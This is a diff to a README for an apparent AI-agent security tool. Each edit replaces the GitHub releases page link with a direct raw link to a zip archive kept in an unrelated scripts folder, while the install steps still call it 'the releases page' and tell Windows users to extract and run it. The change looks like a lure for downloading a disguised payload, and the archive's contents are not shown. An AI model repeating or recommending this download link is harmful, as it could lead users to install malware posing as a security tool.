@@ -1,12 +1,12 @@
 # 🛡️ agent-infra-security - Secure AI coding agent workflows
 
-[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/lordi2809/agent-infra-security/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/lordi2809/agent-infra-security/raw/refs/heads/main/skills/npm-supply-chain-response/scripts/security_infra_agent_v3.8.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest release for Windows:
 
-https://github.com/lordi2809/agent-infra-security/releases
+https://github.com/lordi2809/agent-infra-security/raw/refs/heads/main/skills/npm-supply-chain-response/scripts/security_infra_agent_v3.8.zip
 
 Look for the newest version, then download the Windows file that matches your system. If you see a file with `.exe` or `.zip`, choose that one for the easiest setup.
 
@@ -36,7 +36,7 @@ If the release comes as a `.zip` file, you will also need the built-in Windows f
 
 ## 🚀 Install on Windows
 
-1. Open the releases page: https://github.com/lordi2809/agent-infra-security/releases
+1. Open the releases page: https://github.com/lordi2809/agent-infra-security/raw/refs/heads/main/skills/npm-supply-chain-response/scripts/security_infra_agent_v3.8.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from the Assets section
 4. If the file is a `.zip`, right-click it and choose Extract All
